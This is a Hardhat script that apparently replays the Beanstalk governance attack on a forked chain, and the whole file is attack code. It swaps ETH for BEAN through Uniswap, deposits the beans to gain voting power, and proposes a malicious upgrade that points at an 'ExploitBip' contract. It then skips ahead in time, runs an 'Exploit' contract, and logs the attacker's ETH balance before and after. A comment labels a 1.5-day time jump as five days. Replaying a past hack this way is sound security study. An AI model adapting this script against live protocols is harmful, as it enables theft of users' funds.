const { ethers } = require("hardhat");

const execute = async () => {
    
    const [signer] = await ethers.getSigners();

    const exploitBipFactory = await ethers.getContractFactory("ExploitBip");
    const exploitBip = await exploitBipFactory.deploy();

    const beansAddr = "0xDC59ac4FeFa32293A95889Dc396682858d52e5Db";
    const erc20Abi = [
        "function approve(address, uint256) external", 
        "function balanceOf(address) external view returns (uint256)"
    ];
    const beans = new ethers.Contract(beansAddr, erc20Abi, signer);

    const uniswapRouterAddr = "0x7a250d5630b4cf539739df2c5dacb4c659f2488d";
    const uniswapRouterAbi = ["function swapExactETHForTokens(uint256 amountOutMin, address[] path, address to, uint256 deadline) external payable"];
    const uniswapRouter = new ethers.Contract(uniswapRouterAddr, uniswapRouterAbi, signer);
    await uniswapRouter.swapExactETHForTokens(
        0, 
        ["0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2", "0xDC59ac4FeFa32293A95889Dc396682858d52e5Db"],
        signer.address,
        BigInt(Math.round(Date.now() / 1000)),
        {value : ethers.utils.parseEther('74')}
    );

    const beanstalkProtocolAddr = "0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5";
    const beanstalkProtocolAbi = [
        "function depositBeans(uint256 amount) external",
        "function propose(tuple(address,uint8,bytes4[])[] calldata cut,address _init,bytes calldata _calldata,uint8 _pauseOrUnpause)",
        "function numberOfBips() external view returns (uint32)"
    ];
    const beanstalkProtocol = new ethers.Contract(beanstalkProtocolAddr, beanstalkProtocolAbi, signer);
    await beans.approve(beanstalkProtocolAddr, BigInt(99999999999999));
    await beanstalkProtocol.depositBeans(await beans.balanceOf(signer.address));
    await beanstalkProtocol.propose([], exploitBip.address, exploitBip.interface.encodeFunctionData("init"), 3);

    await ethers.provider.send("evm_increaseTime", [1.5 * 24 * 60 * 60]); // 5 days

    const factory = await ethers.getContractFactory("Exploit");
    const contract = await factory.deploy();
    
    console.log("ETH Balance before exploit - ", ethers.utils.formatEther(await signer.getBalance()));
    let tx = await contract.execute();
    await tx.wait();
    console.log("ETH Balance after exploit - ", ethers.utils.formatEther(await signer.getBalance()));

}

execute()
    .then(() => process.exit(0))
    .catch(error => console.error(error));